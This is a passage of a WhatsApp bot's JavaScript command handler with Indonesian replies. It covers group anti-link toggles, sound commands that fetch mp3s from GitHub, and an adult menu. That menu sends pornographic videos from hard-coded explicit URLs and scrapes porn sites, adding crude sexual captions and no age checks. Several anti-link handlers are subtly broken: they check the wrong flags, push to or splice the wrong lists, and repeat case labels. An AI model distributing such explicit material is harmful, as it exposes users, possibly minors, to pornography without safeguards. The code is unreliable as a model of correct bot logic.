            if (AntiLinkFacebook) return reply("_Sudah Diaktifkan_");
            ntilinkfb.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkFacebook) return reply("_Sudah Dimatikan_");
            let off = ntilinkfb.indexOf(m.chat);
            ntilinkfb.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;
      case "antilinkbokep":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiDewasa) return reply("_Sudah Diaktifkan_");
            ntilinkdewasa.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkbokep.json",
              JSON.stringify(ntilinkdewasa)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link dewasa di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiDewasa) return reply("_Sudah Dimatikan_");
            let off = ntilinkfb.indexOf(m.chat);
            ntilinkdewasa.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkbokep.json",
              JSON.stringify(ntilinkdewasa)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;
      case "antilinktelegram":
      case "antilinktg":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkTelegram) return reply("_Sudah Diaktifkan_");
            ntilinktg.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTelegram) return reply("_Sudah Dimatikan_");
            let off = ntilinktg.indexOf(m.chat);
            ntilinktg.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          }
        }
        break;
      case "antilinkterabox":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiTerabox) return reply("_Sudah Diaktifkan_");
            ntilinkterabox.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkterabox.json",
              JSON.stringify(ntilinkterabox)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Terabox di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkFacebook) return reply("_Sudah Dimatikan_");
            let off = ntilinkterabox.indexOf(m.chat);
            ntilinkfb.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkterabox.json",
              JSON.stringify(ntilinkterabox)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;
      case "antilinkmediafire":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiMediafire) return reply("_Sudah Diaktifkan_");
            ntilink.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkmediafire.json",
              JSON.stringify(ntilinkmediafire)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Mediafire di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiMediafire) return reply("_Sudah Dimatikan_");
            let off = ntilinkfb.indexOf(m.chat);
            ntilinkmediafire.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkmediafire.json",
              JSON.stringify(ntilinkmediafire)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;
      case "antilinkfacebook":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkFacebook) return reply("_Sudah Diaktifkan_");
            ntilinkfb.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkFacebook) return reply("_Sudah Dimatikan_");
            let off = ntilinkfb.indexOf(m.chat);
            ntilinkfb.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }

        break;
      case "antilinktelegram":
      case "antilinktg":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkTelegram) return reply("_Sudah Diaktifkan_");
            ntilinktg.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTelegram) return reply("_Sudah Dimatikan_");
            let off = ntilinktg.indexOf(m.chat);
            ntilinktg.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinktiktok":
      case "antilinktt":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkTiktok) return reply("_Sudah Diaktifkan_");
            ntilinktt.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTiktok) return reply("_Sudah Dimatikan_");
            let off = ntilinktt.indexOf(m.chat);
            ntilinktt.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinktwt":
      case "antilinktwitter":
      case "antilinktwit":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkTwitter) return reply("_Sudah Diaktifkan_");
            ntilinktwt.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTwitter) return reply("_Sudah Dimatikan_");
            let off = ntilinktwt.indexOf(m.chat);
            ntilinktwt.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinkall":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkTwitter) return reply("_Sudah Diaktifkan_");
            ntilinkall.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkAll) return reply("_Sudah Dimatikan_");
            let off = ntilinkall.indexOf(m.chat);
            ntilinkall.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;
      case "antiasing":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiAsing) return reply("_Sudah Diaktifkan_");
            ntasing.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antiasing.json",
              JSON.stringify(ntasing)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
          } else if (args[0] === "off") {
            if (!AntiAsing) return reply("_Sudah Dimatikan_");
            let off = ntasing.indexOf(m.chat);
            ntasing.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antiasing.json",
              JSON.stringify(ntasing)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antiwame":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiWame) return reply("_Sudah Diaktifkan_");
            ntwame.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antiwame.json",
              JSON.stringify(ntwame)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiWame) return reply("_Sudah Dimatikan_");
            let off = ntwame.indexOf(m.chat);
            ntwame.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antiwame.json",
              JSON.stringify(ntwame)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antispam":
        {
          if (!m.isGroup) return reply(mess.OnlyGroup);
          if (!isBotAdmins) return reply(mess.OnlyGrup);
          if (!isAdmins) return reply(mess.admins);
          if (args.length < 1) return reply("on/off?");
          if (args[0] === "on") {
            db.data.chats[m.chat].antispam = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[m.chat].antispam = false;
            reply(`${command} is disabled`);
          }
        }
        break;

      case "antipoll":
        handleFeatureToggle("antipoll", command);
        break;

      case "antisticker":
        handleFeatureToggle("antisticker", command);
        break;

      case "antiimage":
        handleFeatureToggle("antiimage", command);
        break;

      case "antivideo":
        handleFeatureToggle("antivideo", command);
        break;

      case "antiviewonce":
        handleFeatureToggle("antiviewonce", command);
        break;

      case "antimedia":
        handleFeatureToggle("antimedia", command);
        break;

      case "antidocument":
        handleFeatureToggle("antidocument", command);
        break;

      case "anticontact":
        handleFeatureToggle("anticontact", command);
        break;

      case "antilocation":
        handleFeatureToggle("antilocation", command);
        break;

      case "antilinkgc":
        handleFeatureToggle("antilinkgc", command);
        break;

      case "antipromotion":
        handleFeatureToggle("antipromotion", command);
        break;

      case "antiaudio":
        handleFeatureToggle("antiaudio", command);
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗠 𝗨 𝗦 𝗜 𝗖     -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "music1":
      case "music2":
      case "music3":
      case "music4":
      case "music5":
      case "music6":
      case "music7":
      case "music8":
      case "music9":
      case "music10":
      case "music11":
      case "music12":
      case "music13":
      case "music14":
      case "music15":
      case "music16":
      case "music17":
      case "music18":
      case "music19":
      case "music20":
      case "music21":
      case "music22":
      case "music23":
      case "music24":
      case "music25":
      case "music26":
      case "music27":
      case "music28":
      case "music29":
      case "music30":
      case "music31":
      case "music32":
      case "music33":
      case "music34":
      case "music35":
      case "music36":
      case "music37":
      case "music38":
      case "music39":
      case "music40":
      case "music41":
      case "music42":
      case "music43":
      case "music44":
      case "music45":
      case "music46":
      case "music47":
      case "music48":
      case "music49":
      case "music50":
      case "music51":
      case "music52":
      case "music53":
      case "music54":
      case "music55":
      case "music56":
      case "music57":
      case "music58":
      case "music59":
      case "music60":
      case "music61":
      case "music62":
      case "music63":
      case "music64":
      case "music65":
      case "music66":
      case "music67":
      case "music68":
      case "music69":
      case "music70":
      case "music71":
      case "music72":
      case "music73":
      case "music74":
      case "music75":
      case "music76":
      case "music77":
      case "music78":
      case "music79":
      case "music80":
      case "music81":
      case "music82":
      case "music83":
      case "music84":
      case "music85":
        Kilianhst.sendMessage(m.chat, { react: { text: "ðŸŽ§", key: m.key } });
        sound = await getBuffer(
          `https://github.com/ditss-dev/database/raw/main/musikk/${command}.mp3`
        );
        await Kilianhst.sendMessage(
          m.chat,
          { audio: sound, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
        break;
      case "sad1":
      case "sad2":
      case "sad3":
      case "sad4":
      case "sad5":
      case "sad6":
      case "sad7":
      case "sad8":
      case "sad9":
      case "sad10":
      case "sad11":
      case "sad12":
      case "sad13":
      case "sad14":
      case "sad15":
      case "sad16":
      case "sad17":
      case "sad18":
      case "sad19":
      case "sad20":
      case "sad21":
      case "sad22":
      case "sad23":
      case "sad24":
      case "sad25":
      case "sad26":
      case "sad27":
      case "sad28":
      case "sad29":
      case "sad30":
      case "sad31":
      case "sad32":
      case "sad33":
      case "sad34":
      case "sad35":
        const moai0 = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
        );
        Kilianhst.sendMessage(
          m.chat,
          {
            audio: moai0,
            mimetype: "audio/mp4",
            ptt: true,
          },
          { quoted: m }
        );
        //D|ts si pler 🐎
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "Sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        var resttt = await getBuffer(
          `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
        );
        Kilianhst.sendMessage(m.chat, {
          audio: resttt,
          mimetype: "audio/mp4",
          ptt: true,
        });
        //D|ts si pler 🐎
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗠𝗨𝗦𝗜𝗖 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗕 𝗢 𝗞 𝗘 𝗣   -         𝗠 𝗘 𝗡 𝗨
      //===========================================================\\
      case "bokep":
        {
          if (!isCreator && !isPrem) return reply(mess.OnlyOwner);
          if (m.isGroup)
            return reply("*`maybee` harap gunakan di private chat*");
          const caption = `> ${command}`;
          let heyy;
          if (/bokep/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/ditss-dev/ditss/main/okep"
            );
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];

          Kilianhst.sendMessage(
            m.chat,
            {
              video: { url: yeha },
              //thumbnailUrl: rees.thumbnail,
              //renderLargerThumbnail: true,
              caption: caption,
              footer: `Sangek Nyee`,
              buttons: [
                {
                  buttonId: `.${command}`,
                  buttonText: {
                    displayText: "lanjutt",
                  },
                },
                {
                  buttonId: `.menu`,

                  buttonText: {
                    displayText: "back menu",
                  },
                },
              ],
              viewOnce: true,
            },
            {
              quoted: m,
            }
          );
        }
        //D|ts si pler 🐎
        break;
      case "pixhentai":
        if (!q)
          return reply("Masukkan keyword pencarian.\nContoh: pixhentai naruto");

        reply("Tunggu sebentar, sedang mencari...");

        try {
          const res = await fetch(
            `https://api.crafters.biz.id/manga/pixhentai?text=${encodeURIComponent(
              q
            )}`
          );
          const data = await res.json();

          if (!data.status || !data.result || data.result.length === 0) {
            console.log("[PixHentai DEBUG]", data);
            return reply(
              "Gagal memuat data.\nMungkin keyword tidak ditemukan atau API sedang bermasalah."
            );
          }

          const item = data.result[0]; // ambil item pertama

          let hasil = `*Judul:* ${item.title}\n*Link:* ${item.link}`;

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: item.thumbnail },
              caption: hasil,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error(e);
          reply("Terjadi kesalahan saat mengakses API.");
        }
        break;
      case "xnxx":
        if (!q) return reply("Masukkan keyword pencarian.\nContoh: xnxx milf");

        reply("Mencari hasil di XNXX...");
        try {
          const hasil = await searchXNXX(q);
          if (hasil.length === 0) return reply("Tidak ditemukan.");

          let teks = "*Hasil Pencarian XNXX:*\n\n";
          hasil.forEach((v, i) => {
            teks += `*${i + 1}. ${v.title}*\n${v.link}\n\n`;
          });

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: hasil[0].thumb },
              caption: teks,
            },
            { quoted: m }
          );
        } catch (e) {
          console.log(e);
          reply("Terjadi kesalahan saat mengakses XNXX.");
        }
        break;
      case "xvideos":
        if (!q)
          return reply("Masukkan keyword pencarian.\nContoh: xvideos japanese");

        reply("Mencari hasil di Xvideos...");
        try {
          const hasil = await searchXvideos(q);
          if (hasil.length === 0) return reply("Tidak ditemukan.");

          let teks = "*Hasil Pencarian Xvideos:*\n\n";
          hasil.forEach((v, i) => {
            teks += `*${i + 1}. ${v.title}*\n${v.link}\n\n`;
          });

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: hasil[0].thumb },
              caption: teks,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error(e);
          reply("Terjadi kesalahan saat mengakses Xvideos.");
        }
        break;
      case "xvideosplay":
        if (!q)
          return reply(
            "Masukkan judul atau keyword video.\nContoh: xvideosplay cosplay"
          );

        reply("Tunggu sebentar, mencari video...");

        try {
          const result = await xvideosPlay(q);
          if (!result)
            return reply("Video tidak ditemukan atau gagal ambil data.");

          const { title, thumbnail, videoUrl, videoLink } = result;

          await Kilianhst.sendMessage(
            from,
            {
              video: { url: videoUrl },
              caption: `*${title}*\n${videoLink}`,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error(e);
          reply("Terjadi kesalahan saat mengakses Xvideos.");
        }
        break;
      case "bokep1":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah1 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah1,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep2":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah2 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah2,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep3":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah3 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah3,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep4":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah4 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah4,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep5":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah5 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah5,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep6":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah6 = await getBuffer(
          `https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah6,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep7":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah7 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah7,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep8":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah8 = await getBuffer(
